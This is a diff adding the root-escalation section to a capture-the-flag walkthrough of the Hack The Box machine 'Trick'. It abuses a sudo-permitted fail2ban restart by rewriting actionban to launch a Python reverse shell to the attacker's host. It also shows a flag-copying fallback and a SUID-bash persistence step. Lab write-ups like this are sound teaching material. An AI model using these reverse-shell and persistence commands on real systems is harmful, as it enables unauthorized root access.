@@ -1,7 +1,7 @@
 
 ### Tools: nmap, gobuster, dig
 
-### Vulnerabilities: sql injection, sudo
+### Vulnerabilities: sql injection, fail2ban
 
 ```console
 └──╼ [★]$ sudo nmap -sS -sC -sV -T4 10.129.51.233
@@ -139,6 +139,9 @@ jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
 IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----' > id_rsa
 ```
+
+We are in!
+
 ```console
 └──╼ [★]$ ssh michael@10.129.51.233 -i id_rsa
 Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
@@ -151,4 +154,78 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Fri Sep  2 22:24:12 2022 from 10.10.16.8
 michael@trick:~$ 
+```
+
+Now this next part is a little tricky and requires abusing fail2ban. Which is also a pretty neat way to gain root. The way fail2ban works is that it will ban an ip from accessing the network after a certain amount of ailed attempts. Instead we are going to make it run a reverse shell after an amount of incorrect logins.
+
+Note: With how fail2ban works, you only get about 1 minute as root
+
+```console
+michael@trick:~$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+Navigate to /tmp and cp over the files and then edit the file.
+
+```console
+michael@trick:/tmp$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp
+michael@trick:/tmp$ vim iptables-multiport.conf 
+```
+I tried a bunch of different reverse shells but they kept failing to connect. Finally I got this python reverse shell to work.
+
+```console
+actionban = export RHOST="10.10.14.35";export RPORT=1234;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' 
+```
+After editing ve sure to have your nc listener ready and mv the file back and restart the fail2ban service.
+
+```
+michael@trick:/tmp$ mv iptables-multiport.conf /etc/fail2ban/action.d/
+michael@trick:/tmp$ sudo /etc/init.d/fail2ban restart
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+```
+As soon as you restart the service go to town on failing authentication. I kept pressing enter until my listener finally caught it!
+
+```console
+└──╼ [★]$ ssh michael@10.129.53.72
+michael@10.129.53.72's password: 
+Permission denied, please try again.
+michael@10.129.53.72's password: 
+Permission denied, please try again.
+michael@10.129.53.72's password: 
+michael@10.129.53.72: Permission denied (publickey,password).
+```
+Awesome we are in! quickly cat the root flag!
+
+```
+└──╼ [★]$ nc -lvnp 1234
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.53.72.
+Ncat: Connection from 10.129.53.72:43280.
+# cat /root/root.txt
+de94b9107c1d74a9877a605ecf2d0431
+```
+Originally I had was having too many issues with a reverse shell so I opted for changing the root.txt flag to the tmp folder. Which is still a win but it doesnt feel the same without gaining root.
+
+```console
+actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt
+```
+```console
+michael@trick:/tmp$ cat root.txt
+de94b9107c1d74a9877a605ecf2d0431
+michael@trick:/tmp$ 
+```
+
+Another thing we can do is as soon as you gain root access is to create persistence by moving the /usr/bin/bash to /tmp and adding a suid bit.
+
+```console
+# mv /usr/bin/bash /tmp
+# cd /tmp
+cd /tmp
+# chmod u+s bash
 ```
